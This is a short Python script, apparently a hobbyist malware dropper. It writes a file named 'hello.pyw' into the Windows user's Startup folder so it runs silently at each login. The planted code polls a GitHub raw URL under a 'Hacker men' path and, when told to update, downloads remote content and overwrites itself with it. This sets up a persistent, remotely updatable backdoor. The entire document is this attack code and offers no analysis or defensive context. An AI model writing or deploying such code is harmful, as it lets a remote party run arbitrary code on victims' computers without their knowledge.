import os

write = """
import requests
import os

# check for updates
check_for_update = "https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/Check%20for%20update"
response = requests.get(check_for_update)

if "yes" in str(response.content):
    check_for_update = "https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/update"
    response = requests.get(check_for_update)
    open(os.path.basename(__file__), "wb").write(response.content) 
"""


file_path = f"C:/users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/hello.pyw"

with open(file_path, "w") as f:
    f.write(write)
